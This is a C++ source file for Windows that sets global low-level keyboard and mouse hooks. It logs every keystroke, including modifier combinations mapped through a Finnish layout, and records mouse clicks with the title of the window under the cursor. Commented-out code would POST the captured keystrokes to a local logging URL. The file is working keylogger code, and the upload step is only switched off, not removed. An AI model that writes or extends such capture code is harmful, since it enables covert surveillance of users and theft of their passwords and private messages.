#include <iostream>
#include <Windows.h>
#include <cpr/cpr.h>

#include "layouts.h"

const char* DEBUG_URL = "http://127.0.0.1:8000/log";

constexpr int MOUSE_CLICK_CHECKS[2] = {VK_LBUTTON, VK_RBUTTON};
const std::unordered_map<int, const char*> MOUSE_EVENT_TO_STRING {{VK_LBUTTON, "Left Click"}, {VK_RBUTTON, "Right Click"}};

boolean checkModifierStatus(int vkCode) {
    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
};

void addCombinationModifier(std::string* input) {
    if (checkModifierStatus(VK_CONTROL)) {
        *input += "CTRL + ";
    }
    if (checkModifierStatus(VK_SHIFT)) {
        *input += "SHIFT + ";
    }
    if (checkModifierStatus(VK_MENU)) {
        *input += "ALT + ";
    }
    if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
        *input += "WIN + ";
    }
}

LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);

        std::string final;
        addCombinationModifier(&final);

        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
            final += scanCodeMapFI[kbStruct->scanCode];
        }

        printf("%s\n", final.c_str());

        //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
       // cpr::Body{"{\"text\": \"" + body + "\"}"});

       // printf("%s\n", r.text.c_str());
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseCallback(int nCode, WPARAM wParam, WPARAM lParam) {
    auto *mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lParam);
    auto point = mouseStruct->pt;

    for (const int& x : MOUSE_CLICK_CHECKS) {
        if (checkModifierStatus(x)) {
            HWND window = WindowFromPoint(point);

            const size_t len = 256;
            char buffer[len];

            GetWindowTextA(window, buffer, len);

            printf("%s in %s\n", MOUSE_EVENT_TO_STRING.at(x), buffer);
        }
    }

    //printf("x: %d, y: %d\n", point.x, point.y);

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(&KeyboardCallback), nullptr, 0);
    HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, HOOKPROC(&MouseCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard);
    UnhookWindowsHookEx(mouse);

    return 0;
}